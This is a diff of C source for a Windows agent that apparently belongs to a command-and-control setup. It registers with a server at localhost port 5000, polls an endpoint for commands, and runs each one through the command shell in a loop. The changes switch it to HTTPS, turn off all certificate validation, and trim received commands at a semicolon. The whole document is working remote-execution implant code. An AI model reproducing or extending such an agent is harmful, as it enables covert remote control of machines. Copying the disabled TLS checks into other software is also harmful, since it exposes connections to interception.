@@ -5,6 +5,8 @@
 #pragma warning(disable : 4996)
 #pragma comment (lib, "Wininet.lib")
 
+#define INTERNET_FLAG_IGNORE_UNKNOWN_CA 0x00000100
+
 BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {
 
 	HINTERNET hInternet = NULL,
@@ -18,7 +20,11 @@ BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {
 		return FALSE;
 	}
 
-	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	DWORD dwFlags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
+		INTERNET_FLAG_IGNORE_UNKNOWN_CA;
+
+	hInternetFile = InternetOpenUrlW(hInternet, EndpointUrl, NULL, NULL, dwFlags, NULL);
 	if (hInternetFile == NULL) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
 		return FALSE;
@@ -45,27 +51,54 @@ BOOL SendRequest(LPCWSTR EndpointUrl, char* output) {
 
 int main() {
 
-	LPCWSTR Url = L"http://127.0.0.1:5000/agent/register";
-	char request_output[256];
-	SendRequest(Url, request_output);
+	wchar_t Base_Url[256] = L"https://127.0.0.1:5000/";
+	wchar_t Register_Url[256];
+	memcpy(Register_Url, Base_Url, sizeof(Register_Url));
+	LPCWSTR Register_Endpoint = L"agent/register";
+	lstrcatW(Register_Url, Register_Endpoint);
+	wprintf(L"%s\n", Register_Url);
+
+	char request_output[256] = { 0 };
+	SendRequest(Register_Url, request_output);
 	printf("My UUID: %s\n", request_output);
 
+	wchar_t wide_request_output[256] = { 0 };
+	MultiByteToWideChar(CP_UTF8, 0, request_output, -1, wide_request_output, 256);
+
 	wchar_t CommandUrl[256];
-	swprintf(CommandUrl, 256, L"http://127.0.0.1:5000/agent/%S/command", request_output);
-	wprintf(L"URL: %s\n", CommandUrl);
-	char command[256];
+	memcpy(CommandUrl, Base_Url, 256 * sizeof(wchar_t));
+	wchar_t agent_endpoint[256] = L"agent/";
+	wchar_t command_endpoint[256] = L"/command";
+	wcscat(CommandUrl, agent_endpoint);
+	wcscat(CommandUrl, wide_request_output);
+	wcscat(CommandUrl, command_endpoint);
+	wprintf(L"%s\n", CommandUrl);
+
+	char command[256] = {0};
+	char command_stripped[256] = {0};
 	while (TRUE) {
 		memset(command, 0, sizeof(command));
 		SendRequest(CommandUrl, command);
 		char no_command_set[] = "No command set";
 		if (strcmp(command, no_command_set) == 0) {
-			printf("Recieved no command\n");
+			printf("Recieved no Command\n");
 		}
 		else {
-			printf("Recieved Command: %s\n", command);
+			printf("Recieved Command\n");
+
+			for (int i = 0; i < strlen(command); i++) {
+				if (command[i] == ';') {
+					break;
+				}
+				else {
+					strncat_s(command_stripped, sizeof(command_stripped), &command[i], 1);
+				}
+			}
+
+			
 
 			wchar_t Process_Name[256];
-			swprintf(Process_Name, 256, L"/c %S", command);
+			swprintf(Process_Name, 256, L"/c %S", command_stripped);
 
 			STARTUPINFOW			SiW = { 0 };
 			PROCESS_INFORMATION		Pi = { 0 };
